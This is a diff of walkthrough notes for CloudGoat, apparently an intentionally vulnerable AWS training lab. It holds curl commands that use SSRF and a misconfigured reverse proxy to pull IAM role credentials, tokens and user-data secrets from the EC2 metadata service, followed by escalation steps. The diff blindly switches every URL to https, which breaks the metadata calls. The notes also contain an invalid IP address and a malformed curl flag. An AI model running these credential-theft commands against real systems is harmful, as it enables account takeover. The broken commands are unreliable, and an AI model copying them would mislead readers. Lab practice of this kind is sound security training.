@@ -80,7 +80,7 @@ You can read the full documentation for CloudGoat's commands [here in the Usage 
 
 ## use CloudGoat's Docker image
 
-[![Try in PWD](https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png)](http://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml)
+[![Try in PWD](https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png)](https://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml)
 
 ```bash
 # Option 1: Run with default entrypoint
@@ -419,13 +419,13 @@ aws iam list-attached-user-policies \
 
 ### Scenarios 3: cloud_breach_s3 (Small / Moderate)
 
-| ++             | ++                                                                                                                                                     |
-| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Scenario Goal  | Acquire full admin privileges.                                                                                                                         |
-| Size           | Small                                                                                                                                                  |
-| Difficulty     | Easy                                                                                                                                                   |
-| Command        | `$ ./cloudgoat.py create cloud_breach_s3`                                                                                                              |
-| lesson learned | <font color=red> misconfigured reverse-proxy server </font>  `curl http://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’` |
+| ++             | ++                                                                                                                                                      |
+| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Scenario Goal  | Acquire full admin privileges.                                                                                                                          |
+| Size           | Small                                                                                                                                                   |
+| Difficulty     | Easy                                                                                                                                                    |
+| Command        | `$ ./cloudgoat.py create cloud_breach_s3`                                                                                                               |
+| lesson learned | <font color=red> misconfigured reverse-proxy server </font>  `curl https://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’` |
 
 
 > Introduction
@@ -489,15 +489,15 @@ namp 34.228.232.48
 # - and it will return some metadata related information.
 # reveals that the instance is acting as a reverse proxy server.
 
-IPV4=`curl -s http://$EC2IP/latest/meta-data/local-ipv4 -H 'Host:169.254.169.254'`
+IPV4=`curl -s https://$EC2IP/latest/meta-data/local-ipv4 -H 'Host:169.254.169.254'`
 # 10.10.10.238
 # evident that the reverse-proxy server has overly permissive configuration to access AWS EC2 IMDS.
 
-IAMROLENAME=`curl http://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’`
+IAMROLENAME=`curl https://$EC2IP/latest/meta-data/iam/security-credentials -H ‘Host: 169.254.169.254’`
 # cg-backing-WAF-Role-cgidppobj072co
 
 # Use a curl to get more information about the IAM role.
-IAMROLEINFO=`curl http://$EC2IP/latest/meta-data/iam/security-credentials/$IAMROLENAME -H ‘Host: 169.254.169.254’`
+IAMROLEINFO=`curl https://$EC2IP/latest/meta-data/iam/security-credentials/$IAMROLENAME -H ‘Host: 169.254.169.254’`
 # This command returns the access key ID, secret access key and the session token of the IAM instance profile attached to the EC2 Instance. This credential is a temporary one, as it has an expiration date.
 TEMROFILE='lambdaManager'
 TEMROFILE_AWS_ACCESS_KEY_ID=`echo $IAMROLEINFO | jq -r .AccessKeyId`
@@ -581,12 +581,12 @@ aws ec2 modify-instance-metadata-options \
 # -------- 2. exploit IMDS v2 using the mis-configured reverse proxy.
 # generate the token for accessing metadata endpoint with the below HTTP PUT request
 
-TOKEN=`curl -X PUT 'http://54.196.109.217/latest/api/token' \
+TOKEN=`curl -X PUT 'https://54.196.109.217/latest/api/token' \
         --H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' \
         --H 'Host:169.254.169.254' `
 
 # use the security token obtained as part of the HTTP request header.
-curl -s http://$EC2IP/latest/meta-data/local-ipv4 \
+curl -s https://$EC2IP/latest/meta-data/local-ipv4 \
     --H 'X-aws-ec2-metadata-token:$TOKEN' \
     --H 'Host:169.254.169.254'
 # 10.10.10.238
@@ -769,7 +769,7 @@ aws configure --profile cglambda
 # discovers an EC2 instance
 aws ec2 describe-instances --profile cglambda
 
-Go to http://<EC2 instance IP>
+Go to https://<EC2 instance IP>
 
 
 
@@ -781,8 +781,8 @@ Go to http://<EC2 instance IP>
 # Every EC2 instance has access to internal aws metadata by calling a specific endpoint from within the instance.
 # - The metadata contains information and credentials used by the instance.
 # - use those credentials to possibly escalate our privileges
-http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>
+https://<EC2 instance IP>/?url=https://169.254.169.254/latest/meta-data/iam/security-credentials/
+https://<EC2 instance IP>/?url=https://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>
 
 # Add the EC2 instance credentials
 [ec2role]
@@ -936,11 +936,11 @@ cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f1
 # ------------- two ways to analyze this log file.
 # 1. Using grep to find and extract URLs from the log file.
 cat <insert file name here> | grep -Eo ‘(http|https)://[a-zA-Z0-9./?=_%:-]*’
-# http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx
+# https://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx
 
 # 2. Using an ELB log analyzer: log analyzer for AWS Elastic Load Balancer by Ozantunca on GitHub
 elb-log-analyzer <insert log name here>
-# 1 - 9 - http://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx
+# 1 - 9 - https://cg-lb-cgidp347lhz47g.accounid.us-east-1.elb.amazon.com:80:xxxxx
 # try accessing the webpage, as it has been accessed multiple times via different ELBs. It is unavailable.
 
 
@@ -974,11 +974,11 @@ cg-lb-cgidp347lhz47g-accounid.us-east-1.elb.amazon.com:80:xxxxx
 
 # query the instance metadata API to obtain the credentials to reveal the role name of the EC2 instance.
 # The instance metadata contains data about the EC2 instance that you can use to configure or manage the running instance.
-curl http://169.254.269.254/latest/meta-data/iam/security-credentials
-curl http://169.254.269.254/latest/meta-data/iam/security-credentials/role-name
+curl https://169.254.269.254/latest/meta-data/iam/security-credentials
+curl https://169.254.269.254/latest/meta-data/iam/security-credentials/role-name
 # querying the user data to see if there were any user data specified during the creation of the EC2 instance.
 # all the command history, discovers the RDS database credentials and address.
-curl http://169.254.169.254/latest/user-data
+curl https://169.254.169.254/latest/user-data
 
 # The user data contains commands and credentials to the RDS instance (with table “sensitive information”).
 # access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database
@@ -1322,7 +1322,7 @@ ssh -i private-key ubuntu@<PUBLIC_IP_OF_EC2_INSTANCE>
 
 # have the access to EC2 instance, use the IMDS service to do further enumeration.
 # IMDS can be used to access user data that is specified when launching an EC2 instance. User Data tends to have sensitive information.
-curl http://169.254.169.254/latest/user-data
+curl https://169.254.169.254/latest/user-data
 # The User Data on the EC2 contains set of commands to connect to RDS instance from the EC2 instance.
 # The command contains the credentials and endpoint for RDS Instance.
 # The file also reveals the secret that is stored on the RDS instance.
@@ -1335,8 +1335,8 @@ curl http://169.254.169.254/latest/user-data
 # Any overly permissive IAM role can lead to privilege escalation.
 
 # try and steal IAM Role credentials using IMDS.
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-<CLOUDGOAT_ID>
+curl -s https://169.254.169.254/latest/meta-data/iam/security-credentials
+curl -s https://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-<CLOUDGOAT_ID>
 
 # The IAM role credentials we have stolen can be used like any other IAM identity credentials.
 # the IAM role credentials are short lived and have a session token.
